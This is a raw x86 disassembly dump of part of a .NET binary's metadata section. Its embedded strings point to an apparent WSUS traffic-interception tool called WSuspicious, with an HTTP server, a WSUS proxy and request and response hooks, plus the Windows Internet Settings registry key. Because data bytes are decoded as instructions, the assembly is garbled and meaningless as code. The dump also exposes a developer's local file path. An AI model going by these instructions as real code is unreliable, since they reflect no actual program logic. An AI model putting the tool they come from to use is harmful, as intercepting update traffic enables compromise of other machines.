  40c8fe:	45                   	inc    %ebp
  40c8ff:	00 4e 00             	add    %cl,0x0(%esi)
  40c902:	54                   	push   %esp
  40c903:	00 5f 00             	add    %bl,0x0(%edi)
  40c906:	55                   	push   %ebp
  40c907:	00 53 00             	add    %dl,0x0(%ebx)
  40c90a:	45                   	inc    %ebp
  40c90b:	00 52 00             	add    %dl,0x0(%edx)
  40c90e:	5c                   	pop    %esp
  40c90f:	00 53 00             	add    %dl,0x0(%ebx)
  40c912:	6f                   	outsl  %ds:(%esi),(%dx)
  40c913:	00 66 00             	add    %ah,0x0(%esi)
  40c916:	74 00                	je     0x40c918
  40c918:	77 00                	ja     0x40c91a
  40c91a:	61                   	popa
  40c91b:	00 72 00             	add    %dh,0x0(%edx)
  40c91e:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40c923:	00 69 00             	add    %ch,0x0(%ecx)
  40c926:	63 00                	arpl   %eax,(%eax)
  40c928:	72 00                	jb     0x40c92a
  40c92a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c92b:	00 73 00             	add    %dh,0x0(%ebx)
  40c92e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c92f:	00 66 00             	add    %ah,0x0(%esi)
  40c932:	74 00                	je     0x40c934
  40c934:	5c                   	pop    %esp
  40c935:	00 57 00             	add    %dl,0x0(%edi)
  40c938:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40c93e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c93f:	00 77 00             	add    %dh,0x0(%edi)
  40c942:	73 00                	jae    0x40c944
  40c944:	5c                   	pop    %esp
  40c945:	00 43 00             	add    %al,0x0(%ebx)
  40c948:	75 00                	jne    0x40c94a
  40c94a:	72 00                	jb     0x40c94c
  40c94c:	72 00                	jb     0x40c94e
  40c94e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c952:	74 00                	je     0x40c954
  40c954:	56                   	push   %esi
  40c955:	00 65 00             	add    %ah,0x0(%ebp)
  40c958:	72 00                	jb     0x40c95a
  40c95a:	73 00                	jae    0x40c95c
  40c95c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c962:	5c                   	pop    %esp
  40c963:	00 49 00             	add    %cl,0x0(%ecx)
  40c966:	6e                   	outsb  %ds:(%esi),(%dx)
  40c967:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c96b:	00 72 00             	add    %dh,0x0(%edx)
  40c96e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c96f:	00 65 00             	add    %ah,0x0(%ebp)
  40c972:	74 00                	je     0x40c974
  40c974:	20 00                	and    %al,(%eax)
  40c976:	53                   	push   %ebx
  40c977:	00 65 00             	add    %ah,0x0(%ebp)
  40c97a:	74 00                	je     0x40c97c
  40c97c:	74 00                	je     0x40c97e
  40c97e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c984:	73 00                	jae    0x40c986
  40c986:	04 6e                	add    $0x6e,%al
  40c988:	01 00                	add    %eax,(%eax)
  40c98a:	00 04 00             	add    %al,(%eax,%eax,1)
  40c98d:	00 00                	add    %al,(%eax)
  40c98f:	00 04 00             	add    %al,(%eax,%eax,1)
  40c992:	08 00                	or     %al,(%eax)
  40c994:	00 1a                	add    %bl,(%edx)
  40c996:	53                   	push   %ebx
  40c997:	00 48 00             	add    %cl,0x0(%eax)
  40c99a:	41                   	inc    %ecx
  40c99b:	00 32                	add    %dh,(%edx)
  40c99d:	00 35 00 36 00 57    	add    %dh,0x57003600
  40c9a3:	00 69 00             	add    %ch,0x0(%ecx)
  40c9a6:	74 00                	je     0x40c9a8
  40c9a8:	68 00 52 00 53       	push   $0x53005200
  40c9ad:	00 41 00             	add    %al,0x0(%ecx)
  40c9b0:	03 06                	add    (%esi),%eax
  40c9b2:	1d 05 02 06 05       	sbb    $0x5060205,%eax
  40c9b7:	02 06                	add    (%esi),%al
  40c9b9:	08 03                	or     %al,(%ebx)
  40c9bb:	06                   	push   %es
  40c9bc:	12 55 04             	adc    0x4(%ebp),%dl
  40c9bf:	06                   	push   %es
  40c9c0:	12 80 8d 04 06 12    	adc    0x1206048d(%eax),%al
  40c9c6:	80 91 04 06 12 80 95 	adcb   $0x95,-0x7fedf9fc(%ecx)
  40c9cd:	03 06                	add    (%esi),%eax
  40c9cf:	12 20                	adc    (%eax),%ah
  40c9d1:	02 06                	add    (%esi),%al
  40c9d3:	06                   	push   %es
  40c9d4:	02 06                	add    (%esi),%al
  40c9d6:	02 03                	add    (%ebx),%al
  40c9d8:	06                   	push   %es
  40c9d9:	12 4d 03             	adc    0x3(%ebp),%cl
  40c9dc:	06                   	push   %es
  40c9dd:	12 34 03             	adc    (%ebx,%eax,1),%dh
  40c9e0:	06                   	push   %es
  40c9e1:	11 79 03             	adc    %edi,0x3(%ecx)
  40c9e4:	06                   	push   %es
  40c9e5:	12 28                	adc    (%eax),%ch
  40c9e7:	03 06                	add    (%esi),%eax
  40c9e9:	12 6d 03             	adc    0x3(%ebp),%ch
  40c9ec:	06                   	push   %es
  40c9ed:	12 7d 04             	adc    0x4(%ebp),%bh
  40c9f0:	06                   	push   %es
  40c9f1:	12 80 81 07 06 15    	adc    0x15060781(%eax),%al
  40c9f7:	11 69 01             	adc    %ebp,0x1(%ecx)
  40c9fa:	12 6d 03             	adc    0x3(%ebp),%ch
  40c9fd:	06                   	push   %es
  40c9fe:	11 71 03             	adc    %esi,0x3(%ecx)
  40ca01:	06                   	push   %es
  40ca02:	12 75 03             	adc    0x3(%ebp),%dh
  40ca05:	06                   	push   %es
  40ca06:	12 2c 04             	adc    (%esp,%eax,1),%ch
  40ca09:	06                   	push   %es
  40ca0a:	12 80 c9 03 06 12    	adc    0x120603c9(%eax),%al
  40ca10:	40                   	inc    %eax
  40ca11:	0a 06                	or     (%esi),%al
  40ca13:	15 12 80 cd 02       	adc    $0x2cd8012,%eax
  40ca18:	12 80 d1 02 04 06    	adc    0x60402d1(%eax),%al
  40ca1e:	11 80 d5 02 06 1c    	adc    %eax,0x1c0602d5(%eax)
  40ca24:	04 06                	add    $0x6,%al
  40ca26:	12 80 b9 04 06 12    	adc    0x120604b9(%eax),%al
  40ca2c:	80 bd 06 06 15 11 69 	cmpb   $0x69,0x11150606(%ebp)
  40ca33:	01 0e                	add    %ecx,(%esi)
  40ca35:	04 06                	add    $0x6,%al
  40ca37:	12 80 e1 04 06 12    	adc    0x120604e1(%eax),%al
  40ca3d:	80 e5 09             	and    $0x9,%ch
  40ca40:	06                   	push   %es
  40ca41:	15 12 80 e9 01       	adc    $0x1e98012,%eax
  40ca46:	12 80 d1 04 06 12    	adc    0x120604d1(%eax),%al
  40ca4c:	80 ed 04             	sub    $0x4,%ch
  40ca4f:	06                   	push   %es
  40ca50:	12 80 d1 09 06 15    	adc    0x150609d1(%eax),%al
  40ca56:	12 80 a9 01 12 80    	adc    -0x7fedfe57(%eax),%al
  40ca5c:	f1                   	int1
  40ca5d:	07                   	pop    %es
  40ca5e:	06                   	push   %es
  40ca5f:	15 11 69 01 1d       	adc    $0x1d016911,%eax
  40ca64:	05 09 06 15 11       	add    $0x11150609,%eax
  40ca69:	80 c1 01             	add    $0x1,%cl
  40ca6c:	11 80 c5 04 06 11    	adc    %eax,0x110604c5(%eax)
  40ca72:	80 c5 04             	add    $0x4,%ch
  40ca75:	20 01                	and    %al,(%ecx)
  40ca77:	01 05 05 00 01 08    	add    %eax,0x8010005
  40ca7d:	1d 0e 0a 00 01       	sbb    $0x1000a0e,%eax
  40ca82:	15 12 45 02 0e       	adc    $0xe024512,%eax
  40ca87:	0e                   	push   %cs
  40ca88:	1d 0e 07 00 04       	sbb    $0x400070e,%eax
  40ca8d:	02 18                	add    (%eax),%bl
  40ca8f:	08 18                	or     %bl,(%eax)
  40ca91:	08 06                	or     %al,(%esi)
  40ca93:	20 03                	and    %al,(%ebx)
  40ca95:	01 0e                	add    %ecx,(%esi)
  40ca97:	08 02                	or     %al,(%edx)
  40ca99:	06                   	push   %es
  40ca9a:	20 02                	and    %al,(%edx)
  40ca9c:	01 08                	add    %ecx,(%eax)
  40ca9e:	1d 05 08 20 04       	sbb    $0x4200805,%eax
  40caa3:	01 0e                	add    %ecx,(%esi)
  40caa5:	1d 05 0e 0e 09       	sbb    $0x90e0e05,%eax
  40caaa:	20 05 01 0e 1d 05    	and    %al,0x51d0e01
  40cab0:	0e                   	push   %cs
  40cab1:	0e                   	push   %cs
  40cab2:	02 0c 20             	add    (%eax,%eiz,1),%cl
  40cab5:	07                   	pop    %es
  40cab6:	01 0e                	add    %ecx,(%esi)
  40cab8:	1d 05 0e 0e 02       	sbb    $0x20e0e05,%eax
  40cabd:	0e                   	push   %cs
  40cabe:	12 4d 09             	adc    0x9(%ebp),%cl
  40cac1:	20 02                	and    %al,(%edx)
  40cac3:	12 80 b5 1c 12 80    	adc    -0x7fede34b(%eax),%al
  40cac9:	b9 09 20 02 12       	mov    $0x12022009,%ecx
  40cace:	80 b5 1c 12 80 bd 0e 	xorb   $0xe,-0x427fede4(%ebp)
  40cad5:	20 02                	and    %al,(%edx)
  40cad7:	12 80 b5 0e 15 11    	adc    0x11150eb5(%eax),%al
  40cadd:	80 c1 01             	add    $0x1,%cl
  40cae0:	11 80 c5 05 00 01    	adc    %eax,0x10005c5(%eax)
  40cae6:	12 4d 0e             	adc    0xe(%ebp),%cl
  40cae9:	05 00 01 01 12       	add    $0x12010100,%eax
  40caee:	4d                   	dec    %ebp
  40caef:	12 00                	adc    (%eax),%al
  40caf1:	08 12                	or     %dl,(%edx)
  40caf3:	4d                   	dec    %ebp
  40caf4:	0e                   	push   %cs
  40caf5:	0e                   	push   %cs
  40caf6:	0e                   	push   %cs
  40caf7:	11 80 f5 11 80 f5    	adc    %eax,-0xa7fee0b(%eax)
  40cafd:	08 0e                	or     %cl,(%esi)
  40caff:	12 81 01 0a 00 02    	adc    0x2000a01(%ecx),%al
  40cb05:	12 4d 12             	adc    0x12(%ebp),%cl
  40cb08:	80 f9 12             	cmp    $0x12,%cl
  40cb0b:	81 01 06 20 01 02    	addl   $0x2012006,(%ecx)
  40cb11:	12 80 d1 08 01 00    	adc    0x108d1(%eax),%al
  40cb17:	08 00                	or     %al,(%eax)
  40cb19:	00 00                	add    %al,(%eax)
  40cb1b:	00 00                	add    %al,(%eax)
  40cb1d:	1e                   	push   %ds
  40cb1e:	01 00                	add    %eax,(%eax)
  40cb20:	01 00                	add    %eax,(%eax)
  40cb22:	54                   	push   %esp
  40cb23:	02 16                	add    (%esi),%dl
  40cb25:	57                   	push   %edi
  40cb26:	72 61                	jb     0x40cb89
  40cb28:	70 4e                	jo     0x40cb78
  40cb2a:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb2b:	6e                   	outsb  %ds:(%esi),(%dx)
  40cb2c:	45                   	inc    %ebp
  40cb2d:	78 63                	js     0x40cb92
  40cb2f:	65 70 74             	gs jo  0x40cba6
  40cb32:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cb39:	77 73                	ja     0x40cbae
  40cb3b:	01 08                	add    %ecx,(%eax)
  40cb3d:	01 00                	add    %eax,(%eax)
  40cb3f:	07                   	pop    %es
  40cb40:	01 00                	add    %eax,(%eax)
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	00 37                	add    %dh,(%edi)
  40cb46:	01 00                	add    %eax,(%eax)
  40cb48:	1a 2e                	sbb    (%esi),%ch
  40cb4a:	4e                   	dec    %esi
  40cb4b:	45                   	inc    %ebp
  40cb4c:	54                   	push   %esp
  40cb4d:	46                   	inc    %esi
  40cb4e:	72 61                	jb     0x40cbb1
  40cb50:	6d                   	insl   (%dx),%es:(%edi)
  40cb51:	65 77 6f             	gs ja  0x40cbc3
  40cb54:	72 6b                	jb     0x40cbc1
  40cb56:	2c 56                	sub    $0x56,%al
  40cb58:	65 72 73             	gs jb  0x40cbce
  40cb5b:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cb62:	35 01 00 54 0e       	xor    $0xe540001,%eax
  40cb67:	14 46                	adc    $0x46,%al
  40cb69:	72 61                	jb     0x40cbcc
  40cb6b:	6d                   	insl   (%dx),%es:(%edi)
  40cb6c:	65 77 6f             	gs ja  0x40cbde
  40cb6f:	72 6b                	jb     0x40cbdc
  40cb71:	44                   	inc    %esp
  40cb72:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb79:	61                   	popa
  40cb7a:	6d                   	insl   (%dx),%es:(%edi)
  40cb7b:	65 00 10             	add    %dl,%gs:(%eax)
  40cb7e:	01 00                	add    %eax,(%eax)
  40cb80:	0b 57 53             	or     0x53(%edi),%edx
  40cb83:	75 73                	jne    0x40cbf8
  40cb85:	70 69                	jo     0x40cbf0
  40cb87:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cb8a:	75 73                	jne    0x40cbff
  40cb8c:	00 00                	add    %al,(%eax)
  40cb8e:	0a 01                	or     (%ecx),%al
  40cb90:	00 05 44 65 62 75    	add    %al,0x75626544
  40cb96:	67 00 00             	add    %al,(%bx,%si)
  40cb99:	0c 01                	or     $0x1,%al
  40cb9b:	00 07                	add    %al,(%edi)
  40cb9d:	31 2e                	xor    %ebp,(%esi)
  40cb9f:	30 2e                	xor    %ch,(%esi)
  40cba1:	30 2e                	xor    %ch,(%esi)
  40cba3:	30 00                	xor    %al,(%eax)
  40cba5:	00 33                	add    %dh,(%ebx)
  40cba7:	01 00                	add    %eax,(%eax)
  40cba9:	2e 31 2e             	xor    %ebp,%cs:(%esi)
  40cbac:	30 2e                	xor    %ch,(%esi)
  40cbae:	30 2b                	xor    %ch,(%ebx)
  40cbb0:	61                   	popa
  40cbb1:	66 34 65             	data16 xor $0x65,%al
  40cbb4:	38 62 30             	cmp    %ah,0x30(%edx)
  40cbb7:	66 61                	popaw
  40cbb9:	35 35 30 33 31       	xor    $0x31333035,%eax
  40cbbe:	34 31                	xor    $0x31,%al
  40cbc0:	38 64 34 63          	cmp    %ah,0x63(%esp,%esi,1)
  40cbc4:	30 65 61             	xor    %ah,0x61(%ebp)
  40cbc7:	30 61 66             	xor    %ah,0x66(%ecx)
  40cbca:	33 64 37 62          	xor    0x62(%edi,%esi,1),%esp
  40cbce:	61                   	popa
  40cbcf:	31 64 30 61          	xor    %esp,0x61(%eax,%esi,1)
  40cbd3:	66 36 65 65 35 00 00 	ss gs gs xor $0x0,%ax
  40cbda:	2f                   	das
  40cbdb:	01 00                	add    %eax,(%eax)
  40cbdd:	2a 57 53             	sub    0x53(%edi),%dl
  40cbe0:	75 73                	jne    0x40cc55
  40cbe2:	70 69                	jo     0x40cc4d
  40cbe4:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cbe7:	75 73                	jne    0x40cc5c
  40cbe9:	2e 53                	cs push %ebx
  40cbeb:	65 72 76             	gs jb  0x40cc64
  40cbee:	65 72 73             	gs jb  0x40cc64
  40cbf1:	2e 48                	cs dec %eax
  40cbf3:	74 74                	je     0x40cc69
  40cbf5:	70 53                	jo     0x40cc4a
  40cbf7:	65 72 76             	gs jb  0x40cc70
  40cbfa:	65 72 2b             	gs jb  0x40cc28
  40cbfd:	3c 53                	cmp    $0x53,%al
  40cbff:	74 61                	je     0x40cc62
  40cc01:	72 74                	jb     0x40cc77
  40cc03:	3e 64 5f             	ds fs pop %edi
  40cc06:	5f                   	pop    %edi
  40cc07:	33 00                	xor    (%eax),%eax
  40cc09:	00 04 01             	add    %al,(%ecx,%eax,1)
  40cc0c:	00 00                	add    %al,(%eax)
  40cc0e:	00 4c 01 00          	add    %cl,0x0(%ecx,%eax,1)
  40cc12:	47                   	inc    %edi
  40cc13:	57                   	push   %edi
  40cc14:	53                   	push   %ebx
  40cc15:	75 73                	jne    0x40cc8a
  40cc17:	70 69                	jo     0x40cc82
  40cc19:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cc1c:	75 73                	jne    0x40cc91
  40cc1e:	2e 53                	cs push %ebx
  40cc20:	65 72 76             	gs jb  0x40cc99
  40cc23:	65 72 73             	gs jb  0x40cc99
  40cc26:	2e 50                	cs push %eax
  40cc28:	72 6f                	jb     0x40cc99
  40cc2a:	78 79                	js     0x40cca5
  40cc2c:	2e 57                	cs push %edi
  40cc2e:	73 75                	jae    0x40cca5
  40cc30:	73 50                	jae    0x40cc82
  40cc32:	72 6f                	jb     0x40cca3
  40cc34:	78 79                	js     0x40ccaf
  40cc36:	2b 3c 6f             	sub    (%edi,%ebp,2),%edi
  40cc39:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc3a:	42                   	inc    %edx
  40cc3b:	65 66 6f             	outsw  %gs:(%esi),(%dx)
  40cc3e:	72 65                	jb     0x40cca5
  40cc40:	54                   	push   %esp
  40cc41:	75 6e                	jne    0x40ccb1
  40cc43:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc44:	65 6c                	gs insb (%dx),%es:(%edi)
  40cc46:	43                   	inc    %ebx
  40cc47:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc48:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc49:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc4a:	65 63 74 52 65       	arpl   %esi,%gs:0x65(%edx,%edx,2)
  40cc4f:	71 75                	jno    0x40ccc6
  40cc51:	65 73 74             	gs jae 0x40ccc8
  40cc54:	3e 64 5f             	ds fs pop %edi
  40cc57:	5f                   	pop    %edi
  40cc58:	32 36                	xor    (%esi),%dh
  40cc5a:	00 00                	add    %al,(%eax)
  40cc5c:	39 01                	cmp    %eax,(%ecx)
  40cc5e:	00 34 57             	add    %dh,(%edi,%edx,2)
  40cc61:	53                   	push   %ebx
  40cc62:	75 73                	jne    0x40ccd7
  40cc64:	70 69                	jo     0x40cccf
  40cc66:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cc69:	75 73                	jne    0x40ccde
  40cc6b:	2e 53                	cs push %ebx
  40cc6d:	65 72 76             	gs jb  0x40cce6
  40cc70:	65 72 73             	gs jb  0x40cce6
  40cc73:	2e 50                	cs push %eax
  40cc75:	72 6f                	jb     0x40cce6
  40cc77:	78 79                	js     0x40ccf2
  40cc79:	2e 57                	cs push %edi
  40cc7b:	73 75                	jae    0x40ccf2
  40cc7d:	73 50                	jae    0x40cccf
  40cc7f:	72 6f                	jb     0x40ccf0
  40cc81:	78 79                	js     0x40ccfc
  40cc83:	2b 3c 6f             	sub    (%edi,%ebp,2),%edi
  40cc86:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc87:	52                   	push   %edx
  40cc88:	65 71 75             	gs jno 0x40cd00
  40cc8b:	65 73 74             	gs jae 0x40cd02
  40cc8e:	3e 64 5f             	ds fs pop %edi
  40cc91:	5f                   	pop    %edi
  40cc92:	32 37                	xor    (%edi),%dh
  40cc94:	00 00                	add    %al,(%eax)
  40cc96:	3a 01                	cmp    (%ecx),%al
  40cc98:	00 35 57 53 75 73    	add    %dh,0x73755357
  40cc9e:	70 69                	jo     0x40cd09
  40cca0:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cca3:	75 73                	jne    0x40cd18
  40cca5:	2e 53                	cs push %ebx
  40cca7:	65 72 76             	gs jb  0x40cd20
  40ccaa:	65 72 73             	gs jb  0x40cd20
  40ccad:	2e 50                	cs push %eax
  40ccaf:	72 6f                	jb     0x40cd20
  40ccb1:	78 79                	js     0x40cd2c
  40ccb3:	2e 57                	cs push %edi
  40ccb5:	73 75                	jae    0x40cd2c
  40ccb7:	73 50                	jae    0x40cd09
  40ccb9:	72 6f                	jb     0x40cd2a
  40ccbb:	78 79                	js     0x40cd36
  40ccbd:	2b 3c 6f             	sub    (%edi,%ebp,2),%edi
  40ccc0:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccc1:	52                   	push   %edx
  40ccc2:	65 73 70             	gs jae 0x40cd35
  40ccc5:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccc6:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccc7:	73 65                	jae    0x40cd2e
  40ccc9:	3e 64 5f             	ds fs pop %edi
  40cccc:	5f                   	pop    %edi
  40cccd:	32 38                	xor    (%eax),%bh
  40cccf:	00 00                	add    %al,(%eax)
  40ccd1:	43                   	inc    %ebx
  40ccd2:	01 00                	add    %eax,(%eax)
  40ccd4:	3e 57                	ds push %edi
  40ccd6:	53                   	push   %ebx
  40ccd7:	75 73                	jne    0x40cd4c
  40ccd9:	70 69                	jo     0x40cd44
  40ccdb:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40ccde:	75 73                	jne    0x40cd53
  40cce0:	2e 53                	cs push %ebx
  40cce2:	65 72 76             	gs jb  0x40cd5b
  40cce5:	65 72 73             	gs jb  0x40cd5b
  40cce8:	2e 50                	cs push %eax
  40ccea:	72 6f                	jb     0x40cd5b
  40ccec:	78 79                	js     0x40cd67
  40ccee:	2e 57                	cs push %edi
  40ccf0:	73 75                	jae    0x40cd67
  40ccf2:	73 50                	jae    0x40cd44
  40ccf4:	72 6f                	jb     0x40cd65
  40ccf6:	78 79                	js     0x40cd71
  40ccf8:	2b 3c 77             	sub    (%edi,%esi,2),%edi
  40ccfb:	72 69                	jb     0x40cd66
  40ccfd:	74 65                	je     0x40cd64
  40ccff:	44                   	inc    %esp
  40cd00:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40cd04:	54                   	push   %esp
  40cd05:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd06:	43                   	inc    %ebx
  40cd07:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd08:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd09:	73 6f                	jae    0x40cd7a
  40cd0b:	6c                   	insb   (%dx),%es:(%edi)
  40cd0c:	65 3e 64 5f          	gs ds fs pop %edi
  40cd10:	5f                   	pop    %edi
  40cd11:	32 39                	xor    (%ecx),%bh
  40cd13:	00 00                	add    %al,(%eax)
  40cd15:	3e 01 00             	add    %eax,%ds:(%eax)
  40cd18:	39 57 53             	cmp    %edx,0x53(%edi)
  40cd1b:	75 73                	jne    0x40cd90
  40cd1d:	70 69                	jo     0x40cd88
  40cd1f:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cd22:	75 73                	jne    0x40cd97
  40cd24:	2e 53                	cs push %ebx
  40cd26:	65 72 76             	gs jb  0x40cd9f
  40cd29:	65 72 73             	gs jb  0x40cd9f
  40cd2c:	2e 50                	cs push %eax
  40cd2e:	72 6f                	jb     0x40cd9f
  40cd30:	78 79                	js     0x40cdab
  40cd32:	2e 57                	cs push %edi
  40cd34:	73 75                	jae    0x40cdab
  40cd36:	73 50                	jae    0x40cd88
  40cd38:	72 6f                	jb     0x40cda9
  40cd3a:	78 79                	js     0x40cdb5
  40cd3c:	2b 3c 77             	sub    (%edi,%esi,2),%edi
  40cd3f:	72 69                	jb     0x40cdaa
  40cd41:	74 65                	je     0x40cda8
  40cd43:	54                   	push   %esp
  40cd44:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd45:	43                   	inc    %ebx
  40cd46:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd47:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd48:	73 6f                	jae    0x40cdb9
  40cd4a:	6c                   	insb   (%dx),%es:(%edi)
  40cd4b:	65 3e 64 5f          	gs ds fs pop %edi
  40cd4f:	5f                   	pop    %edi
  40cd50:	33 30                	xor    (%eax),%esi
  40cd52:	00 00                	add    %al,(%eax)
  40cd54:	05 01 00 01 00       	add    $0x10001,%eax
  40cd59:	00 3a                	add    %bh,(%edx)
  40cd5b:	01 00                	add    %eax,(%eax)
  40cd5d:	35 57 53 75 73       	xor    $0x73755357,%eax
  40cd62:	70 69                	jo     0x40cdcd
  40cd64:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40cd67:	75 73                	jne    0x40cddc
  40cd69:	2e 53                	cs push %ebx
  40cd6b:	65 72 76             	gs jb  0x40cde4
  40cd6e:	65 72 73             	gs jb  0x40cde4
  40cd71:	2e 50                	cs push %eax
  40cd73:	72 6f                	jb     0x40cde4
  40cd75:	78 79                	js     0x40cdf0
  40cd77:	2e 57                	cs push %edi
  40cd79:	73 75                	jae    0x40cdf0
  40cd7b:	73 50                	jae    0x40cdcd
  40cd7d:	72 6f                	jb     0x40cdee
  40cd7f:	78 79                	js     0x40cdfa
  40cd81:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  40cd84:	2d 63 74 6f 72       	sub    $0x726f7463,%eax
  40cd89:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40cd8d:	32 32                	xor    (%edx),%dh
  40cd8f:	5f                   	pop    %edi
  40cd90:	30 3e                	xor    %bh,(%esi)
  40cd92:	64 00 00             	add    %al,%fs:(%eax)
  40cd95:	0a 01                	or     (%ecx),%al
  40cd97:	00 02                	add    %al,(%edx)
  40cd99:	00 00                	add    %al,(%eax)
  40cd9b:	00 00                	add    %al,(%eax)
  40cd9d:	01 00                	add    %eax,(%eax)
  40cd9f:	00 26                	add    %ah,(%esi)
  40cda1:	01 00                	add    %eax,(%eax)
  40cda3:	84 6b 00             	test   %ch,0x0(%ebx)
  40cda6:	00 02                	add    %al,(%edx)
  40cda8:	00 54 02 0d          	add    %dl,0xd(%edx,%eax,1)
  40cdac:	41                   	inc    %ecx
  40cdad:	6c                   	insb   (%dx),%es:(%edi)
  40cdae:	6c                   	insb   (%dx),%es:(%edi)
  40cdaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdb0:	77 4d                	ja     0x40cdff
  40cdb2:	75 6c                	jne    0x40ce20
  40cdb4:	74 69                	je     0x40ce1f
  40cdb6:	70 6c                	jo     0x40ce24
  40cdb8:	65 00 54 02 09       	add    %dl,%gs:0x9(%edx,%eax,1)
  40cdbd:	49                   	dec    %ecx
  40cdbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdbf:	68 65 72 69 74       	push   $0x74697265
  40cdc4:	65 64 00 26          	gs add %ah,%fs:(%esi)
  40cdc8:	01 00                	add    %eax,(%eax)
  40cdca:	4c                   	dec    %esp
  40cdcb:	14 00                	adc    $0x0,%al
  40cdcd:	00 02                	add    %al,(%edx)
  40cdcf:	00 54 02 0d          	add    %dl,0xd(%edx,%eax,1)
  40cdd3:	41                   	inc    %ecx
  40cdd4:	6c                   	insb   (%dx),%es:(%edi)
  40cdd5:	6c                   	insb   (%dx),%es:(%edi)
  40cdd6:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdd7:	77 4d                	ja     0x40ce26
  40cdd9:	75 6c                	jne    0x40ce47
  40cddb:	74 69                	je     0x40ce46
  40cddd:	70 6c                	jo     0x40ce4b
  40cddf:	65 00 54 02 09       	add    %dl,%gs:0x9(%edx,%eax,1)
  40cde4:	49                   	dec    %ecx
  40cde5:	6e                   	outsb  %ds:(%esi),(%dx)
  40cde6:	68 65 72 69 74       	push   $0x74697265
  40cdeb:	65 64 00 00          	gs add %al,%fs:(%eax)
  40cdef:	00 00                	add    %al,(%eax)
  40cdf1:	00 00                	add    %al,(%eax)
  40cdf3:	00 3f                	add    %bh,(%edi)
  40cdf5:	b8 31 ba 00 01       	mov    $0x100ba31,%eax
  40cdfa:	4d                   	dec    %ebp
  40cdfb:	50                   	push   %eax
  40cdfc:	02 00                	add    (%eax),%al
  40cdfe:	00 00                	add    %al,(%eax)
  40ce00:	89 00                	mov    %eax,(%eax)
  40ce02:	00 00                	add    %al,(%eax)
  40ce04:	44                   	inc    %esp
  40ce05:	ce                   	into
  40ce06:	00 00                	add    %al,(%eax)
  40ce08:	44                   	inc    %esp
  40ce09:	b0 00                	mov    $0x0,%al
	...
  40ce13:	00 01                	add    %al,(%ecx)
  40ce15:	00 00                	add    %al,(%eax)
  40ce17:	00 13                	add    %dl,(%ebx)
  40ce19:	00 00                	add    %al,(%eax)
  40ce1b:	00 27                	add    %ah,(%edi)
  40ce1d:	00 00                	add    %al,(%eax)
  40ce1f:	00 cd                	add    %cl,%ch
  40ce21:	ce                   	into
  40ce22:	00 00                	add    %al,(%eax)
  40ce24:	cd b0                	int    $0xb0
	...
  40ce32:	00 00                	add    %al,(%eax)
  40ce34:	10 00                	adc    %al,(%eax)
	...
  40ce42:	00 00                	add    %al,(%eax)
  40ce44:	52                   	push   %edx
  40ce45:	53                   	push   %ebx
  40ce46:	44                   	inc    %esp
  40ce47:	53                   	push   %ebx
  40ce48:	4d                   	dec    %ebp
  40ce49:	2a 76 cd             	sub    -0x33(%esi),%dh
  40ce4c:	89 93 0e 45 a7 ad    	mov    %edx,-0x5258baf2(%ebx)
  40ce52:	d4 b5                	aam    $0xb5
  40ce54:	63 a2 bb ad 01 00    	arpl   %esp,0x1adbb(%edx)
  40ce5a:	00 00                	add    %al,(%eax)
  40ce5c:	43                   	inc    %ebx
  40ce5d:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  40ce61:	65 72 73             	gs jb  0x40ced7
  40ce64:	5c                   	pop    %esp
  40ce65:	73 2e                	jae    0x40ce95
  40ce67:	6b 73 65 6e          	imul   $0x6e,0x65(%ebx),%esi
  40ce6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce6c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40ce6e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce6f:	74 6f                	je     0x40cee0
  40ce71:	76 5c                	jbe    0x40cecf
  40ce73:	44                   	inc    %esp
  40ce74:	6f                   	outsl  %ds:(%esi),(%dx)
  40ce75:	63 75 6d             	arpl   %esi,0x6d(%ebp)
  40ce78:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ce7a:	74 73                	je     0x40ceef
